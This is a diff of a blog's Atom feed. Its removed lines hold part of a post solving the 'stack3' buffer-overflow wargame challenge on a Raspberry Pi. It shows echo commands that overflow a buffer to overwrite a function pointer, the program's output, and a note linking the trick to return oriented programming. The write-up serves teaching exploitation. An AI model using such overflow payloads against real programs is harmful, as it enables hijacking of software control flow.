-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\x04\x01\x00'&lt;/span&gt; | ./stack3
-calling &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;pointer, jumping to 0x0001047c
-code flow successfully changed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We could also jump to the middle of &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt;, to 0x00010484, and we will
-have the same result. The only problem is that the program will execute
-the &lt;em&gt;epilogue&lt;/em&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; &lt;strong&gt;without&lt;/strong&gt; having executed its &lt;em&gt;prologue&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-31554f46753f568be15bed866ad590c3&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-31554f46753f568be15bed866ad590c3&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;Does this ring some bells? This is the base of &lt;em&gt;return oriented
-programming&lt;/em&gt; or ROP.
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The result? &lt;code class=&quot;highlighter-rouge&quot;&gt;pop {fp, pc}&lt;/code&gt; will restore &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt; to the next element in the
-stack which most likely will not be a valid address. Happy segfault!&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x84\x04\x01\x00'&lt;/span&gt; | ./stack3
-calling &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;pointer, jumping to 0x00010484
-code flow successfully changed
-Segmentation fault
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Gehn</name></author><summary type="html">This time the goal is to make the program print the message &quot;code flow successfully changed&quot;.</summary></entry></feed>
+&lt;p&gt;But that’s for another post.&lt;/p&gt;</content><author><name>Gehn</name></author><summary type="html">Fifth challenge with a small introduction to process continuation.</summary></entry></feed>
